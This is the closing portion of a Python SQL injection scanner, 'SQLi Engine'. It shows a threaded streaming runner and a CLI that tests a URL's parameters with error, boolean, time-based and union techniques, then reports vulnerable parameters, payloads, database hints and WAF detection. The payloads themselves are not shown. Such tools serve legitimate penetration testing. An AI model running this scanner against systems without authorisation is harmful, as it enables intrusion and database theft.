            done.set()

    threading.Thread(target=_worker, daemon=True,
                     name=f"sqli-{url[:32]}").start()

    yield {
        "type": "start",
        "url": url,
        "options": {
            "techniques": o["techniques"],
            "max_params": o["max_params"],
            "rate_limit": o["rate_limit"],
        },
    }

    while not done.is_set():
        with events_lock:
            pending, events[:] = list(events), []
        for ev in pending:
            yield ev
        done.wait(timeout=0.4)

    with events_lock:
        for ev in events:
            yield ev

    if "error" in result_holder:
        yield {"type": "error", "message": result_holder["error"]}
    else:
        yield {"type": "result", "data": result_holder.get("result", {})}


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import argparse
    import json
    import sys

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    p = argparse.ArgumentParser(description="SQLi Engine v1.0.0")
    p.add_argument("url", help="URL with parameters (e.g. https://example.com/?id=1)")
    p.add_argument("--techniques", default="error,boolean,time,union",
                   help="comma-separated: error,boolean,time,union")
    p.add_argument("--max-params", type=int, default=10)
    p.add_argument("--concurrency", type=int, default=8)
    p.add_argument("--rate-limit", type=float, default=20.0)
    p.add_argument("--json", action="store_true")
    p.add_argument("--stream", action="store_true")
    p.add_argument("--wordlists", action="store_true",
                   help="print wordlist metadata and exit")
    args = p.parse_args()

    if args.wordlists:
        print(json.dumps(ensure_wordlists(), indent=2))
        sys.exit(0)

    techniques = [t.strip() for t in args.techniques.split(",") if t.strip()]

    options = {
        "techniques":   techniques,
        "max_params":   args.max_params,
        "concurrency":  args.concurrency,
        "rate_limit":   args.rate_limit,
    }

    if args.stream:
        for ev in run_streaming(args.url, options):
            t = ev.get("type")
            if t == "start":
                print(f"[start] {ev['url']}  techniques={ev['options']['techniques']}")
            elif t == "progress":
                print(f"[{ev['percent']:3d}%] {ev['done']}/{ev['total']}  {ev['label']}")
            elif t == "result":
                if args.json:
                    print(json.dumps(ev["data"], indent=2))
            elif t == "error":
                print(f"[ERROR] {ev['message']}", file=sys.stderr)
        sys.exit(0)

    report = run(args.url, options)

    if args.json:
        print(json.dumps(report, indent=2))
        sys.exit(0 if report["vulnerable"] else 1)

    print()
    print("═" * 72)
    print(f"  SQLi Scan Report — {report['url']}")
    print("═" * 72)
    print(f"  Vulnerable        : {'YES' if report['vulnerable'] else 'no'}")
    print(f"  Techniques tested : {', '.join(report['techniques_tested'])}")
    print(f"  Parameters        : {len(report['parameters_tested'])}")
    print(f"  Requests sent     : {report['requests_sent']}")
    print(f"  Elapsed           : {report['elapsed']}s")
    if report.get("waf_detected"):
        print(f"  WAF               : {report['waf_detected']}")
    print()

    if report["findings"]:
        for f in report["findings"]:
            print(f"  [{f['status'].upper():10s}] [{f['technique']:14s}] "
                  f"param={f['parameter']:20s} conf={f['confidence']}")
            print(f"              payload: {f['payload'][:80]}")
            if f.get("db_hint"):
                print(f"              db: {f['db_hint']}")
            print()
    else:
        print("  No SQL injection detected.")
    print()
